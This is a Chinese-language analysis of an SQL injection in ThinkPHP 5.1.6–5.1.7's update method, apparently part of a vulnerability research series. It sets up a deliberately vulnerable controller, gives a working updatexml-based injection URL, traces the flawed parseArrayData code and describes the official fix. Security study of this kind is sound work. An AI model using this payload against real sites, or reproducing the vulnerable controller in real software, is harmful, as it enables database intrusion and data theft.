本系列文章将针对 **ThinkPHP** 的历史漏洞进行分析，今后爆出的所有 **ThinkPHP** 漏洞分析，也将更新于 [ThinkPHP-Vuln](https://github.com/Mochazz/ThinkPHP-Vuln) 项目上。本篇文章，将分析 **ThinkPHP** 中存在的 **SQL注入漏洞** （ **update** 方法注入）。

## 漏洞概要

本次漏洞存在于 **Mysql** 类的 **parseArrayData** 方法中由于程序没有对数据进行很好的过滤，将数据拼接进 **SQL** 语句，导致 **SQL注入漏洞** 的产生。漏洞影响版本： **5.1.6<=ThinkPHP<=5.1.7** (非最新的 **5.1.8** 版本也可利用)。

## 漏洞环境

通过以下命令获取测试环境代码：

```bash
composer create-project --prefer-dist topthink/think tpdemo
```

将 **composer.json** 文件的 **require** 字段设置成如下：

```json
"require": {
    "php": ">=5.6.0",
    "topthink/framework": "5.1.7"
}
```

然后执行 `composer update` ，并将 **application/index/controller/Index.php** 文件代码设置如下：

```php
<?php
namespace app\index\controller;

class Index
{
    public function index()
    {
        $username = request()->get('username/a');
        db('users')->where(['id' => 1])->update(['username' => $username]);
        return 'Update success';
    }
}
```

在 **config/database.php** 文件中配置数据库相关信息，并开启 **config/app.php** 中的 **app_debug** 和 **app_trace** 。创建数据库信息如下：

```sql
create database tpdemo;
use tpdemo;
create table users(
	id int primary key auto_increment,
	username varchar(50) not null
);
insert into users(id,username) values(1,'mochazz');
```

访问 **http://localhost:8000/index/index/index?username[0]=point&username[1]=1&username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&username[3]=0** 链接，即可触发 **SQL注入漏洞** 。（没开启 **app_debug** 是无法看到 **SQL** 报错信息的）

![1](CTF%20总结/PHP-Audit-Labs/Part2/ThinkPHP5/ThinkPHP5漏洞分析之SQL注入2/1.png)

## 漏洞分析

![2](CTF%20总结/PHP-Audit-Labs/Part2/ThinkPHP5/ThinkPHP5漏洞分析之SQL注入2/2.png)

首先在官方发布的 **5.1.9** 版本更新说明中，发现其中提到该版本包含了一个安全更新，我们可以查阅其 **commit** 记录，发现其删除了 **parseArrayData** 方法，这处 **case** 语句之前出现过 **insert** 注入，所以比较可疑。

![3](CTF%20总结/PHP-Audit-Labs/Part2/ThinkPHP5/ThinkPHP5漏洞分析之SQL注入2/3.png)

接着我们直接跟着上面的攻击 **payload** 来看看漏洞原理。首先， **payload** 数据经过 **ThinkPHP** 内置方法的过滤后（不影响我们的 **payload** ），直接进入了 **Query** 类的 **update** 方法，该方法调用了 **Connection** 类的 **update** 方法，该方法又调用了 **$this->builder** 的 **insert** 方法，这里的 **$this->builder** 为 **\think\db\builder\Mysql** 类，该类继承于 **Builder** 类，代码如下：

![4](CTF%20总结/PHP-Audit-Labs/Part2/ThinkPHP5/ThinkPHP5漏洞分析之SQL注入2/4.png)

在 **Builder** 类的 **update** 方法中，调用了 **parseData** 方法。这个方法中的 **case** 语句之前存在 **SQL注入漏洞** ，现已修复，然而却多了 **default** 代码段，而这段代码也是在新版本中被删除的。

![5](CTF%20总结/PHP-Audit-Labs/Part2/ThinkPHP5/ThinkPHP5漏洞分析之SQL注入2/5.png)

我们跟进到 **parseArrayData** 方法，发现其中又将可控变量进行拼接，其变量来源均来自用户输入。之后的过程就和之前的 **insert** 注入一样，用 **str_replace** 将变量填充到 **SQL** 语句中，最终执行，导致 **SQL注入漏洞** 。

![6](CTF%20总结/PHP-Audit-Labs/Part2/ThinkPHP5/ThinkPHP5漏洞分析之SQL注入2/6.png)

上面 **第15行** 的 **$result** 相当于 **$a('$b($c)')** 其中 **$a、$b、$c** 均可控。最后形成的 **SQL** 语句如下：

```sql
UPDATE `users`  SET `username` = $a('$b($c)')  WHERE  `id` = 1;
```

接着我们想办法闭合即可。我们令 **$a = updatexml(1,concat(0x7,user(),0x7e),1)^** 、 **$b = 0** 、 **$c = 1** ，即：

```sql
UPDATE `users` SET `username` = updatexml(1,concat(0x7,user(),0x7e),1)^('0(1)') WHERE `id` = 1
```

## 漏洞修复

官方修复方法比较暴力，直接将 **parseArrayData** 方法删除了。

![7](CTF%20总结/PHP-Audit-Labs/Part2/ThinkPHP5/ThinkPHP5漏洞分析之SQL注入2/7.png)

## 攻击总结

最后，再通过一张攻击流程图来回顾整个攻击过程。

![8](CTF%20总结/PHP-Audit-Labs/Part2/ThinkPHP5/ThinkPHP5漏洞分析之SQL注入2/8.png)